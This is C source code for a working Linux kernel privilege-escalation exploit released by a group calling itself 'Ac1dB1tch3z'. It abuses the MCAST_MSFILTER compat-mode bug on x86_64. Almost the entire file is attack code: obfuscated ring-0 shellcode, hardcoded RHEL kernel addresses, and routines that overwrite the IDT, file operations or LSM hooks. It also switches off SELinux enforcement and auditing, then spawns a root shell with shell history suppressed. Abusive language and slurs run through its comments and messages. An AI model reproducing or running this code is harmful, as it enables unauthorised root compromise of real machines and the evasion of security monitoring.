/*

Ac1dB1tch3z Vs Linux Kernel x86_64 0day

Today is a sad day..

R.I.P.
Tue, 29 Apr 2008  /  Tue, 7 Sep 2010

a bit of history:
MCAST_MSFILTER Compat mode bug found... upon commit! (2 year life on this one)

author    David L Stevens <dlstevens () us ibm com>
    Tue, 29 Apr 2008 10:23:22 +0000 (03:23 -0700)
committer    David S. Miller <davem () davemloft net>
    Tue, 29 Apr 2008 10:23:22 +0000 (03:23 -0700)
This patch adds support for getsockopt for MCAST_MSFILTER for
both IPv4 and IPv6. It depends on the previous setsockopt patch,
and uses the same method.

Signed-off-by: David L Stevens <dlstevens () us ibm com>
Signed-off-by: YOSHIFUJI Hideaki <yoshfuji () linux-ipv6 org>
Signed-off-by: David S. Miller <davem () davemloft net>
------------------------------------------------------------

Thank you for signing-off on this one guys.

This exploit has been tested very thoroughly
over the course of the past few years on many many targets.

Thanks to redhat for being nice enough to backport it into early
kernel versions (anything from later August 2008+)

Ac1dB1tch3z would like to say F*** YOU Ben Hawkes. You are a new hero! You saved the
plan8 man. Just a bit too l8.

PS:
OpenVZ Payload / GRsec bypass removed for kidiots and fame whores. (same thing right ;))

*/

#include <poll.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sched.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>


#ifndef __i386__
#error "r34d th3 c0d3 m0r0n!!# () #"
#else
#define _GNU_SOURCE
#define __dgdhdytrg55 unsigned int
#define __yyrhdgdtfs66ytgetrfd unsigned long long
#define __dhdyetgdfstreg__ memcpy

#define VERT                  "\033[32m"
#define NORM                  "\033[0m"
#define BANNER                VERT"Ac1dB1tCh3z "NORM"VS Linux kernel 2.6 kernel 0d4y\n"

#define KALLSYMS              "/proc/kallsyms"
#define TMAGIC_66TDFDRTS      "/proc/timer_list"
#define SELINUX_PATH          "/selinux/enforce"
#define RW_FOPS               "timer_list_fops"
#define PER_C_DHHDYDGTREM7765 "per_cpu__current_task"
#define PREPARE_GGDTSGFSRFSD  "prepare_creds"
#define OVERRIDE_GGDTSGFSRFSD "override_creds"
#define REVERT_DHDGTRRTEFDTD  "revert_creds"
#define Y0Y0SMAP              0x100000UL
#define Y0Y0CMAP              0x200000UL
#define Y0Y0STOP              (Y0Y0SMAP+0xFFC)
#define J0J0S                 0x00200000UL
#define J0J0R00T              0x002000F0UL
#define PAGE_SIZE             0x1000

#define KERN_DHHDYTMLADSFPYT     0x1
#define KERN_DGGDYDTEGGETFDRLAK  0x2
#define KERN_HHSYPPLORQTWGFD     0x4


#define KERN_DIS_GGDYYTDFFACVFD_IDT      0x8
#define KERN_DIS_DGDGHHYTTFSR34353_FOPS     0x10
#define KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM      0x20

#define KERN_DIS_GGSTEYGDTREFRET_SEL1NUX  0x40

#define isRHHGDPPLADSF(ver) (strstr(ver, ".el4") || strstr(ver,".el5"))

#define TRY_REMAP_DEFAULT 1

#define __gggdfstsgdt_dddex(f, a...) do { fprintf(stdout, f, ## a); } while(0)
#define __pppp_tegddewyfg(s) do { fprintf(stdout, "%s", s); } while(0)
#define __xxxfdgftr_hshsgdt(s) do { perror(s); exit(-1); } while(0)
#define __yyy_tegdtfsrer(s) do { fprintf(stderr, s); exit(-1); } while(0)

static char buffer[1024];
static int s;
static int flags=0;
volatile static socklen_t magiclen=0;
static int useidt=0, usefops=0, uselsm=0;
static __yyrhdgdtfs66ytgetrfd _m_fops=0,_m_cred[3] = {0,0,0};
static __dgdhdytrg55 _m_cpu_off=0;
static char krelease[64];
static char kversion[128];

#define R0C_0FF 14
static char ttrg0ccc[]=
"\x51\x57\x53\x56\x48\x31\xc9\x48\x89\xf8\x48\x31\xf6\xbe\x41\x41\x41\x41"
"\x3b\x30\x75\x1f\x3b\x70\x04\x75\x1a\x3b\x70\x08\x75\x15\x3b\x70\x0c"
"\x75\x10\x48\x31\xdb\x89\x18\x89\x58\x04\x89\x58\x08\x89\x58\x0c\xeb\x11"
"\x48\xff\xc0\x48\xff\xc1\x48\x81\xf9\x4c\x04\x00\x00\x74\x02"
"\xeb\xcc\x5e\x5b\x5f\x59\xc3";


#define R0YTTTTUHLFSTT_OFF1 5
#define R0YGGSFDARTDF_DHDYTEGRDFD_D 21
#define R0TDGFSRSLLSJ_SHSYSTGD 45
char r1ngrrrrrrr[]=
"\x53\x52\x57\x48\xbb\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd3"
"\x50\x48\x89\xc7\x48\xbb\x42\x42\x42\x42\x42\x42\x42\x42"
"\xff\xd3\x48\x31\xd2\x89\x50\x04\x89\x50\x14\x48\x89\xc7"
"\x48\xbb\x43\x43\x43\x43\x43\x43\x43\x43"
"\xff\xd3\x5f\x5f\x5a\x5b\xc3";


#define RJMPDDTGR_OFF 13
#define RJMPDDTGR_DHDYTGSCAVSF 7
#define RJMPDDTGR_GDTDGTSFRDFT 25
static char ttrfd0[]=
"\x57\x50\x65\x48\x8b\x3c\x25\x00\x00\x00\x00"
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd0"
"\x58\x5f"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xc3";


/* implement selinux bypass for IDT ! */
#define RJMPDDTGR_OFF_IDT 14
#define RJMPDDTGR_DYHHTSFDARE 8
#define RJMPDDTGR_DHDYSGTSFDRTAC_SE 27
static char ruujhdbgatrfe345[]=
"\x0f\x01\xf8\x65\x48\x8b\x3c\x25\x00\x00\x00\x00"
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd0"
"\x0f\x01\xf8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x48\xcf";



#define CJE_4554TFFDTRMAJHD_OFF  10
#define RJMPDDTGR_AYYYDGTREFCCV7761_OF      23
static char dis4blens4sel1nuxhayettgdr64545[]=
"\x41\x52\x50"
"\xb8\x00\x00\x00\x00"
"\x49\xba\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x89\x02"
"\x49\xba\x42\x42\x42\x42\x42\x42\x42\x42"
"\x41\x89\x02"
"\x58\x41\x5a";




/* rhel LSM stuffs */
#define RHEL_LSM_OFF 98

struct LSM_rhel
{
  __yyrhdgdtfs66ytgetrfd selinux_ops;
  __yyrhdgdtfs66ytgetrfd capability_ops;
  __yyrhdgdtfs66ytgetrfd dummy_security_ops;

  __yyrhdgdtfs66ytgetrfd selinux_enforcing;
  __yyrhdgdtfs66ytgetrfd audit_enabled;

  const char *krelease;
  const char *kversion;

};

struct LSM_rhel known_targets[4]=
{
  {
    0xffffffff8031e600ULL,
    0xffffffff8031fec0ULL,
    0xffffffff804acc00ULL,

    0xffffffff804af960ULL,
    0xffffffff8049b124ULL,

    "2.6.18-164.el5",
    "#1 SMP Thu Sep 3 03:28:30 EDT 2009"  // to manage minor/bug fix changes
  },
  {
   0xffffffff8031f600ULL,
   0xffffffff80320ec0ULL,
   0xffffffff804afc00ULL,

   0xffffffff804b2960ULL,
   0xffffffff8049e124ULL,

   "2.6.18-164.11.1.el5",
   "#1 SMP Wed Jan 6 13:26:04 EST 2010"
  },
  {
    0xffffffff805296a0ULL,
    0xffffffff8052af60ULL,
    0xffffffff806db1e0ULL,

    0xffffffff806ddf40ULL,
    0xffffffff806d5324ULL,

    "2.6.18-164.11.1.el5xen",
    "#1 SMP Wed Jan 20 08:06:04 EST 2010"   // default xen
  },
  {
    0xffffffff8031f600ULL,// d selinux_ops
    0xffffffff80320ec0ULL,// d capability_ops
    0xffffffff804afc00ULL,// B dummy_security_ops

    0xffffffff804b2960ULL,// B selinux_enforcing
    0xffffffff8049e124ULL,// B audit_enabled

    "2.6.18-164.11.1.el5",
    "#1 SMP Wed Jan 20 07:32:21 EST 2010" // tripwire target LoL
   }

};

static struct LSM_rhel *curr_target=NULL, dyn4nt4n1labeggeyrthryt;

struct socketcallAT
{
  int s;
  int level;
  int optname;
  void *optval;
  volatile socklen_t *optlen;
}__attribute__((packed));

struct idt64from32_s
{
  unsigned short limit;
  unsigned long base;
}__attribute__((packed));

static __yyrhdgdtfs66ytgetrfd getidt()
{
  struct idt64from32_s idt;
  memset(&idt, 0x00, sizeof(struct idt64from32_s));
  asm volatile("sidt %0" : "=m"(idt));
  return idt.base | 0xFFFFFFFF00000000ULL;
}


static int isSelinuxEnabled()
{
  FILE *selinux_f;
  selinux_f = fopen(SELINUX_PATH, "r");
  if(selinux_f == NULL)
  {
    if(errno == EPERM)
      return 1;
    else
     return 0;
  }

  fclose(selinux_f);
  return 1;
}

static int wtfyourunhere_heee(char *out_release, char* out_version)
{
 int ret; const char*ptr;
 int count=0;
 char r[32], *bptr;
 struct utsname buf;
 ret =  uname(&buf);

 if(ret < 0)
   return -1;

 strcpy(out_release, buf.release);
 strcpy(out_version, buf.version);

 ptr = buf.release;
 bptr = r;
 memset(r, 0x00, sizeof(r));
 while(*ptr)
 {
   if(count == 2)
    {
      if(*ptr >= '0' && *ptr <= '9')
        *bptr++ = *ptr;
      else
        break;
    }

   if(*ptr == '.')
     count++;
   ptr++;
 }

 if(strlen(r) < 1 || !atoi(r))
   return -1;

 return atoi(r);
}


static void p4tch_sel1nux_codztegfaddczda(struct LSM_rhel *table)
{
  *((__yyrhdgdtfs66ytgetrfd *)(dis4blens4sel1nuxhayettgdr64545 + CJE_4554TFFDTRMAJHD_OFF)) = table->selinux_enforcing;
  *((__yyrhdgdtfs66ytgetrfd *)(dis4blens4sel1nuxhayettgdr64545 + RJMPDDTGR_AYYYDGTREFCCV7761_OF)) = table->audit_enabled;
  __dhdyetgdfstreg__(ttrfd0 + RJMPDDTGR_GDTDGTSFRDFT, dis4blens4sel1nuxhayettgdr64545, sizeof(dis4blens4sel1nuxhayettgdr64545)-1);
  __dhdyetgdfstreg__(ruujhdbgatrfe345 + RJMPDDTGR_DHDYSGTSFDRTAC_SE, dis4blens4sel1nuxhayettgdr64545, sizeof(dis4blens4sel1nuxhayettgdr64545)-1);
}


static __yyrhdgdtfs66ytgetrfd get_sym_ex(const char* s, const char* filename, int ignore_flag)
{
  FILE *ka;
  char line[512];
  char reloc_a[64];
  char reloc[64];

  if(!(flags & KERN_HHSYPPLORQTWGFD) && !ignore_flag)
    return 0;

  ka = fopen(filename, "r");
  if(!ka)
    return 0;

  while(fgets(line, 512, ka) != NULL)
  {
    char *l_p  = line;
    char *ra_p = reloc_a;
    char *r_p    = reloc;
    memset(reloc, 0x00, sizeof(reloc));
    memset(reloc_a, 0x00, sizeof(reloc_a));
    while(*l_p != ' ' && (ra_p - reloc_a)  < 64)
      *ra_p++ = *l_p++;
    l_p += 3;
    while(*l_p != ' ' && *l_p != '\n' && *l_p != '\t' && (r_p - reloc) < 64)
      *r_p++ = *l_p++;

    if(!strcmp(reloc, s))
    {
      __gggdfstsgdt_dddex("$$$ %s->%s\n", s, reloc_a);
      return strtoull(reloc_a, NULL, 16);
    }
  }

  return 0;
}


static inline __yyrhdgdtfs66ytgetrfd get_sym(const char* s)
{
  return get_sym_ex(s, KALLSYMS, 0);
}

static int parse_cred(const char* val)
{
  int i=0;
  const char* p = val;
  char local[64], *l;
  for(i=0; i<3; i++)
  {
    memset(local, 0x00, sizeof(local));
    l = local;
    while(*p && *p != ',')
      *l++ = *p++;

    if(!(*p) && i != 2)
      return -1;

    _m_cred[i] = strtoull(local, NULL, 16);
    p++;
  }

  return 0;
}


#define SELINUX_OPS        "selinux_ops"
#define DUMMY_SECURITY_OPS "dummy_security_ops"
#define CAPABILITY_OPS     "capability_ops"
#define SELINUX_ENFORCING  "selinux_enforcing"
#define AUDIT_ENABLED      "audit_enabled"

struct LSM_rhel *lsm_rhel_find_target(int check_rhel)
{
   int i;
   char mapbuf[128];
   struct LSM_rhel *lsm = &(known_targets[0]);

   if(check_rhel && !isRHHGDPPLADSF(krelease))
   {
     __pppp_tegddewyfg("!!! N0t a RH3l k3rn3l \n");
     return NULL;
   }

   __pppp_tegddewyfg("$$$ L00k1ng f0r kn0wn t4rg3tz.. \n");
   for(i=0; i<sizeof(known_targets)/sizeof(struct LSM_rhel); i++, lsm++)
   {
     if(!strcmp(krelease, lsm->krelease) && !strcmp(kversion, lsm->kversion))
     {
       __gggdfstsgdt_dddex("$$$ Th1z b1tch 1z t0azt. kn0wn t4rg3t: %s %s \n", lsm->krelease, lsm->kversion);
       return lsm;
     }
   }

   __pppp_tegddewyfg("$$$ c0mput3r 1z aqu1r1ng n3w t4rg3t...\n");
   strcpy(mapbuf, "/boot/System.map-");
   strcat(mapbuf, krelease);

   dyn4nt4n1labeggeyrthryt.selinux_ops        = get_sym_ex(SELINUX_OPS, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.dummy_security_ops = get_sym_ex(DUMMY_SECURITY_OPS, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.capability_ops     = get_sym_ex(CAPABILITY_OPS, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.selinux_enforcing  = get_sym_ex(SELINUX_ENFORCING, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.audit_enabled      = get_sym_ex(AUDIT_ENABLED, mapbuf, 1);


   if(!dyn4nt4n1labeggeyrthryt.selinux_ops ||
      !dyn4nt4n1labeggeyrthryt.dummy_security_ops ||
      !dyn4nt4n1labeggeyrthryt.capability_ops ||
      !dyn4nt4n1labeggeyrthryt.selinux_enforcing ||
      !dyn4nt4n1labeggeyrthryt.audit_enabled)
	return NULL;


   return &dyn4nt4n1labeggeyrthryt;
}

static void put_your_hands_up_hooker(int argc, char *argv[])
{
  int fd,ver,ret;
  char __b[16];


  fd = open(KALLSYMS, O_RDONLY);
  ret = read(fd, __b, 16); // dummy read
  if((fd >= 0 && ret > 0))
  {
    __pppp_tegddewyfg("$$$ Kallsyms +r\t\n"); // d0nt p4tch m3 br0
    flags |= KERN_HHSYPPLORQTWGFD;
  }
  close(fd);

  ver = wtfyourunhere_heee(krelease, kversion);
  if(ver < 0)
    __yyy_tegdtfsrer("!!!  Un4bl3 t0 g3t r3l3as3 wh4t th3 fuq!\n");

  __gggdfstsgdt_dddex("$$$ K3rn3l r3l3as3: %s\n", krelease);


  if(argc != 1)
  {
    while( (ret = getopt(argc, argv, "siflc:k:o:")) > 0)
    {
      switch(ret)
      {
        case 'i':
          flags |= KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM|KERN_DIS_DGDGHHYTTFSR34353_FOPS;
          useidt=1; // u have to use -i to force IDT Vector
          break;

        case 'f':
          flags |= KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM|KERN_DIS_GGDYYTDFFACVFD_IDT;
          break;

	case 'l':
	  flags |= KERN_DIS_GGDYYTDFFACVFD_IDT|KERN_DIS_DGDGHHYTTFSR34353_FOPS;
	  break;

        case 'c':
          if(!optarg || parse_cred(optarg) < 0)
              __yyy_tegdtfsrer("!!! Un4bl3 t0 p4s3 cr3d c0d3z\n");
          break;

        case 'k':
          if(optarg)
            _m_fops = strtoull(optarg, NULL, 16);
          else
	     __yyy_tegdtfsrer("!!! Un4bl3 t0 p4rs3 f0P numb3rs\n");
          break;

        case 's':
          if(!isSelinuxEnabled())
            __pppp_tegddewyfg("??? wh4t th3 fuq s3l1nux 1z n0t 3v3n 3n4bl3d!?\n");
          else
            flags |= KERN_DIS_GGSTEYGDTREFRET_SEL1NUX;
          break;

        case 'o':
          if(optarg)
            _m_cpu_off = strtoull(optarg, NULL, 16);
	  else
	    __yyy_tegdtfsrer("!!! Un4bl3 t0 p4rs3 f0p c0mput3r numb3rs\n");
          break;
      }
    }
  }


  if(ver >= 29) // needs cred structure
  {
    flags |= KERN_DGGDYDTEGGETFDRLAK;

    if(!_m_cred[0] || !_m_cred[1] || !_m_cred[2])
    {
      _m_cred[0] = get_sym(PREPARE_GGDTSGFSRFSD);
      _m_cred[1] = get_sym(OVERRIDE_GGDTSGFSRFSD);
      _m_cred[2] = get_sym(REVERT_DHDGTRRTEFDTD);
    }

    if(!_m_cred[0] || !_m_cred[1] || !_m_cred[2])
    {
      __yyy_tegdtfsrer("!!! Err0r 1n s3tt1ng cr3d sh3llc0d3z\n");
    }

    __pppp_tegddewyfg("$$$ Kernel Credentials detected\n");
    *((__yyrhdgdtfs66ytgetrfd *)(r1ngrrrrrrr + R0YTTTTUHLFSTT_OFF1)) = _m_cred[0];
    *((__yyrhdgdtfs66ytgetrfd *)(r1ngrrrrrrr + R0YGGSFDARTDF_DHDYTEGRDFD_D)) = _m_cred[1];
    *((__yyrhdgdtfs66ytgetrfd *)(r1ngrrrrrrr + R0TDGFSRSLLSJ_SHSYSTGD)) = _m_cred[2];
  }

  if(ver >= 30)  // needs cpu offset
  {
    flags |= KERN_DHHDYTMLADSFPYT;
    if(!_m_cpu_off)
    _m_cpu_off = (__dgdhdytrg55)get_sym(PER_C_DHHDYDGTREM7765);

    if(!_m_cpu_off)
      __yyy_tegdtfsrer("!!! Err0r 1n s3tt1ng cr3d sh3llc0d3z\n");

    __pppp_tegddewyfg("$$$ K3rn3l per_cpu r3l0cs 3n4bl3d!\t\n");
    *((__dgdhdytrg55 *)(ttrfd0 + RJMPDDTGR_DHDYTGSCAVSF)) = _m_cpu_off;
    *((__dgdhdytrg55 *)(ruujhdbgatrfe345 + RJMPDDTGR_DYHHTSFDARE)) = _m_cpu_off;
  }
}


static void env_prepare(int argc, char* argv[])
{

  put_your_hands_up_hooker(argc, argv);

  if(!(flags & KERN_DIS_DGDGHHYTTFSR34353_FOPS))  // try fops
  {
    __pppp_tegddewyfg("??? Trying the F0PPPPPPPPPPPPPPPPpppppppppp_____ m3th34d\n");
    if(!_m_fops)
      _m_fops = get_sym(RW_FOPS);

    /* TODO: do RW check for newer -mm kernels which has timer_list_struct RO
     * Thanks to the guy who killed this vector... you know who you are:)
     * Lucky for you, there are more:)
     */

    if(_m_fops)
    {
      usefops=1;
      __pppp_tegddewyfg("$$$ w34p0n 0f ch01c3: F0PZzZzzz\n");
    }
  }


  if(!usefops && !(flags & KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM)) // try lsm(rhel)
  {
    curr_target = lsm_rhel_find_target(1);
    if(!curr_target)
    {
       __pppp_tegddewyfg("!!! u4bl3 t0 f1nd t4rg3t!? W3'll s33 ab0ut th4t!\n");
    }
    else
      uselsm=1;
  }


  if(useidt && (flags & KERN_DIS_GGSTEYGDTREFRET_SEL1NUX))
  {
    // -i flag
    curr_target = lsm_rhel_find_target(0);
    if(!curr_target)
    {
       __pppp_tegddewyfg("!!! Un4lb3 t0 f1nd t4rg3t: c0ntinu3 w1th0ut s3linsux d1s4bl3.\n");
       /* remove Selinux Flag */
       flags &= ~KERN_DIS_GGSTEYGDTREFRET_SEL1NUX;
    }
  }


  if(!usefops && !useidt && !uselsm)
    __yyy_tegdtfsrer("!!! 3v3ryth3ng f41l3d!!*@&^@&*^ () * try an0th3r 0d4y L0l\n");
}


static inline int get_socklen(__yyrhdgdtfs66ytgetrfd addr, __dgdhdytrg55 stack)
{
  int socklen_l = 8 + stack - addr - 16;
  return socklen_l;
}

static struct socketcallAT at;
static __dgdhdytrg55 idtover[4] =
             {0x00100000UL,
              0x0020ee00UL,
              0x00000000UL,
              0x00000000UL};


static void fillsocketcallAT()
{
 at.s = s;
 at.level = SOL_IP;
 at.optname = MCAST_MSFILTER;
 at.optval = buffer;
 at.optlen = &magiclen;
}


static void bitch_call(struct socketcallAT *at, void *stack)
{
  asm volatile(
      "push %%ebx\t\n"
      "push %%esi\t\n"
      "push %%ecx\t\n"
      "push %%edx\t\n"
      "movl $0x66, %%eax\t\n"
      "movl $0xf, %%ebx\t\n"
      "movl %%esp, %%esi\t\n"
      "movl %0, %%ecx\t\n"
      "movl %1, %%esp\t\n"
      "int $0x80\t\n"
      "movl %%esi, %%esp\t\n"
      "pop %%edx\t\n"
      "pop %%ecx\t\n"
      "pop %%esi\t\n"
      "pop %%ebx\t\n"
      :  : "r"(at), "r"(stack)  : "memory", "eax", "ecx", "ebx", "esi"
     );
}

static void __setmcbuffer(__dgdhdytrg55 value)
{
  int i;
  __dgdhdytrg55 *p = (__dgdhdytrg55*)buffer;
  for(i=0; i<sizeof(buffer)/sizeof(void*); i++)
    *(p+i) = value;
}

static void idt_smash(__yyrhdgdtfs66ytgetrfd idtbase)
{
  int i;
  __dgdhdytrg55 curr;
  for(i=0; i<sizeof(idtover)/sizeof(idtover[0]);i++)
  {
    curr = idtover[i];
    __setmcbuffer(curr);
    magiclen =  get_socklen(idtbase + (i*4), Y0Y0STOP);
    bitch_call(&at, (void*)Y0Y0STOP);
  }
}


static void y0y0stack()
{
  void* map = mmap((void*)Y0Y0SMAP,
                   PAGE_SIZE,
                   PROT_READ|PROT_WRITE,
                   MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
                   -1,0);
  if(MAP_FAILED == map)
    __xxxfdgftr_hshsgdt("mmap");
}

static void y0y0code()
{
  void* map = mmap((void*)Y0Y0CMAP,
                   PAGE_SIZE,

#ifdef TRY_REMAP_DEFAULT
		   PROT_READ|PROT_WRITE,
#else
                   PROT_READ|PROT_WRITE|PROT_EXEC,
#endif
                   MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
                   -1,0);
  if(MAP_FAILED == map)
    __xxxfdgftr_hshsgdt("mmap");

}


static int rey0y0code(unsigned long old)
{
  int fd;
  void *map;
  volatile char wizard;
  char cwd[1024];

  getcwd(cwd, sizeof(cwd));
  strcat(cwd, "/__tmpfile");

  unlink(cwd);
  fd = open(cwd, O_RDWR|O_CREAT, S_IRWXU);
  if(fd < 0)
    return -1;

  write(fd, (const void*)old, PAGE_SIZE);
  if(munmap((void*)old, PAGE_SIZE) < 0)
    return -1;

  map = mmap((void*)old,
                   PAGE_SIZE,
                   PROT_READ|PROT_EXEC,
                   MAP_PRIVATE|MAP_FIXED,
                   fd,0);
  if(map == MAP_FAILED)
    return -1;

  /* avoid lazy page fault handler
   * Triple Fault when using idt vector
   * and no pages are already mapped:)
   */

  wizard = *((char*)old);
  unlink(cwd);
  return wizard;
}


int main(int argc, char*argv[])
{
  int uid,fd;
  __yyrhdgdtfs66ytgetrfd *patch, idtb;
  struct pollfd pfd;


  printf(BANNER);

  uid = getuid();

  env_prepare(argc, argv);

  y0y0stack();
  y0y0code();

  if(useidt)
  {
    idtb = getidt();
    __gggdfstsgdt_dddex("$$$ h0m3 b4s3 addr3ss: %llx\n", idtb);
    __pppp_tegddewyfg("$$$ Bu1ld1ng r1ngzer0c00l sh3llc0d3 - IDT m3th34d\n");
    patch = (__yyrhdgdtfs66ytgetrfd*)(ruujhdbgatrfe345 + RJMPDDTGR_OFF_IDT);
    *patch = (__yyrhdgdtfs66ytgetrfd)(J0J0R00T);

    __pppp_tegddewyfg("$$$ Prepare: m0rn1ng w0rk0ut b1tch3z\n");

    if(flags & KERN_DIS_GGSTEYGDTREFRET_SEL1NUX)
    {
      __pppp_tegddewyfg("$$$ add1ng sp3c14l c0de t0 rem0v3 s3linux t3rr0r1zt thr34t\n");
      p4tch_sel1nux_codztegfaddczda(curr_target);
    }

    __dhdyetgdfstreg__((void*)J0J0S,  ruujhdbgatrfe345, sizeof(ruujhdbgatrfe345));
  }
  else if(usefops || uselsm)
  {
    __pppp_tegddewyfg("$$$ Bu1ld1ng r1ngzer0c00l sh3llc0d3 - F0PZzzZzZZ/LSD(M) m3th34d\n");
    patch = (__yyrhdgdtfs66ytgetrfd*)(ttrfd0 + RJMPDDTGR_OFF);
    *patch = (__yyrhdgdtfs66ytgetrfd)(J0J0R00T);

    __setmcbuffer(J0J0S);

    __pppp_tegddewyfg("$$$ Prepare: m0rn1ng w0rk0ut b1tch3z\n");
    if(uselsm && (flags & KERN_DIS_GGSTEYGDTREFRET_SEL1NUX))
    {
        __pppp_tegddewyfg("$$$ add1ng sp3c14l c0de t0 rem0v3 s3linux t3rr0r1zt thr34t\n");
	p4tch_sel1nux_codztegfaddczda(curr_target);
    }
    __dhdyetgdfstreg__((void*)J0J0S, ttrfd0, sizeof(ttrfd0));
  }



  /* set shellcode level 2 */
  if(flags & KERN_DGGDYDTEGGETFDRLAK)
  {
    __pppp_tegddewyfg("$$$ Us1ng cr3d s3ash3llc0d3z\n");
    __dhdyetgdfstreg__((void*)J0J0R00T, r1ngrrrrrrr, sizeof(r1ngrrrrrrr));
  }
  else
  {
    __pppp_tegddewyfg("$$$ Us1ng st4nd4rd s3ash3llz\n");
    __dhdyetgdfstreg__((void*)J0J0R00T,  ttrg0ccc, sizeof(ttrg0ccc));
    *((unsigned int*)(J0J0R00T + R0C_0FF)) = uid;
  }

  __pppp_tegddewyfg("$$$ 0p3n1ng th3 m4giq p0rt4l\n");
  s = socket(AF_INET, SOCK_DGRAM, 0);
  if(s < 0)
    __xxxfdgftr_hshsgdt("socket");

  fillsocketcallAT();


#ifdef TRY_REMAP_DEFAULT
  if(rey0y0code(Y0Y0CMAP) < 0)
    __yyy_tegdtfsrer("!!! Un4bl3 t0 r3m4p sh1t\t\n");
#endif

  if(useidt)
  {

    __yyrhdgdtfs66ytgetrfd idtentry = idtb + (2*sizeof(__yyrhdgdtfs66ytgetrfd)*0xdd);
    __gggdfstsgdt_dddex("$$$ Us1ng 1dt 3ntry: %d\n", 0xdd);
    idt_smash((idtentry));

    sleep(1);
    asm volatile("int $0xdd\t\n");
  }
  else if(usefops)
  {
    magiclen = get_socklen(_m_fops, Y0Y0STOP);
    magiclen -= 7*sizeof(__yyrhdgdtfs66ytgetrfd);
    __gggdfstsgdt_dddex("$$$ m4q1c p0rt4l l3n f0und: 0x%x\n", magiclen);

    __pppp_tegddewyfg("$$$ 0v3r thr0w f0ps g0v3rnm3nt\n");
    bitch_call(&at, (void*)Y0Y0STOP);
    sleep(1);

    fd = open(TMAGIC_66TDFDRTS, O_RDONLY);
    if(fd < 0)
      __xxxfdgftr_hshsgdt("!!! fuq t1m3r_l1st");

    pfd.fd = fd;
    pfd.events = POLLIN | POLLOUT;
    poll(&pfd, 1, 0);
  }
  else if(uselsm)
  {
    int msqid;
    __yyrhdgdtfs66ytgetrfd selinux_msg_off = curr_target->selinux_ops + (8*RHEL_LSM_OFF);
    __yyrhdgdtfs66ytgetrfd dummy_msg_off   = curr_target->dummy_security_ops + (8*RHEL_LSM_OFF);
    __yyrhdgdtfs66ytgetrfd capability_msg_off = curr_target->capability_ops + (8*RHEL_LSM_OFF);


    msqid = msgget(0, IPC_PRIVATE|0600);
    if(msqid < 0)
      __xxxfdgftr_hshsgdt("!!! fuqqqqqq msgg3t");


    magiclen =  get_socklen(selinux_msg_off, Y0Y0STOP);
    __setmcbuffer(J0J0S);
    bitch_call(&at, (void*)Y0Y0STOP);
    magiclen = get_socklen(selinux_msg_off+4, Y0Y0STOP);
    __setmcbuffer(0);
    bitch_call(&at, (void*)Y0Y0STOP);


    magiclen =  get_socklen(dummy_msg_off, Y0Y0STOP);
    __setmcbuffer(J0J0S);
    bitch_call(&at, (void*)Y0Y0STOP);
    magiclen =  get_socklen(dummy_msg_off+4, Y0Y0STOP);
    __setmcbuffer(0);
    bitch_call(&at, (void*)Y0Y0STOP);


    magiclen =  get_socklen(capability_msg_off, Y0Y0STOP);
    __setmcbuffer(J0J0S);
    bitch_call(&at, (void*)Y0Y0STOP);
    magiclen =  get_socklen(capability_msg_off+4, Y0Y0STOP);
    __setmcbuffer(0);
    bitch_call(&at, (void*)Y0Y0STOP);


    msgctl(msqid, IPC_RMID, (struct msqid_ds *) NULL); // exploit it
  }

  munmap((void*)Y0Y0CMAP, PAGE_SIZE);

  /* exec */
  if(getuid() == 0)
  {
    pid_t pid;
    __pppp_tegddewyfg("$$$ bl1ng bl1ng n1gg4 :PppPpPPpPPPpP\n");
    pid = fork();
    if(pid == 0)
    {
      char *args[] = {"/bin/sh", "-i", NULL};
      char *envp[] = {"TERM=linux", "BASH_HISTORY=/dev/null", "HISTORY=/dev/null", "history=/dev/null", "HISTFILE=/dev/null", "HISTFILESIZE=0",
                      "PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin", NULL };
      execve("/bin/sh", args, envp);
    }
    else
    {
      int status;
      waitpid(pid, &status, 0);
    }
  }
  else
    __pppp_tegddewyfg("!!! y0u fuq1ng f41l. g3t th3 fuq 0ut!\n");

  close(s);
  return 0;
}

#endif // -m32